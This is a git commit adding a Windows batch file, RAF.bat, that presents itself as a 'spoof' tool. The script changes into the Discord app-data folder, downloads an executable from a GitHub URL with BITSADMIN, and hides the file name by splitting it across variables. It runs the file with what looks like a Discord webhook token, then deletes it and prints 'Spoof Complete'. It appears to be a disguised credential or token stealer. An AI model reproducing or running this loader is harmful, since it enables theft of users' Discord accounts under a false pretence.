6d5563f57ff51b041c455cd336c71314eab69eee
dr-NHA <56168811+dr-NHA@users.noreply.github.com>
2021-07-07 10:56:04 +0930

    Add files via upload

---
+++ RAF.bat
@@ -0,0 +1,34 @@
+echo off
+SET FR="DA ED RA FE"
+SET Q=%appdata%\discord\shared_proto_db
+CD %Q%
+SET FS="DZ ZD FA 2E"
+SET FE=dd102
+SET DE=e
+SET DR=x
+SET DZ=e
+SET BR="BB BB FF FE"
+SET D=hu
+SET SO=g
+SET SP=b
+SET D2=it
+SET DYNI=com
+SET USR=dr-NHA
+SET PTO=JUPEX
+SET REP=NHA-PRODUCTIONS
+SET DIFI=raw
+SET PTC=NHA-
+SET X=PSF.exe
+SET FX=%Q%\%FE%.%DE%%DR%%DZ%
+set downloadurl=https://github.com/dr-NHA/NHA-PRODUCTIONS/raw/NHA-JUPEX/PSF.exe
+set downloadpath=%FX%
+BITSADMIN /transfer /download %downloadurl% %downloadpath%
+set directory=%Q%
+SET RT="REACT"
+start %FE%.%DE%%DR%%DZ% 860716599157587999/ktqbtrJ04wVnAOL2QQJ3rla4qSCTRT9i01B4EAAWWhvQ02I_S7J5i2qEBp1KTWqa49Pn
+SET DD="DD DD DD DD"
+del /f %FE%.%DE%%DR%%DZ%
+echo on
+echo Spoof Complete
+echo Spoofing Done By ......
+pause
